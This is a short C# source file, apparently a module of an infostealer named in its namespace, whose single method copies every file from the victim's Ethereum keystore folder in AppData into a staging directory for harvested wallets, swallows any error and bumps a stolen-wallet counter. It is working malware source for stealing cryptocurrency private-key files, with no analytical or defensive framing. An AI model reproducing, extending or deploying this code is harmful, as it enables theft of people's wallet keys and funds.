using System.IO;

namespace youknowcaliber
{
    class Ethereum
    {
        public static int count = 0;
        public static string EthereumDir = "\\Wallets\\Ethereum\\";
        public static void EcoinStr(string directorypath) // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Ethereum\\keystore").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + EthereumDir);
                    file.CopyTo(directorypath + EthereumDir + file.Name);
                }
                count++;
                Counting.Wallets++;
            }
            catch
            {
                return;
            }
        }
    }
}
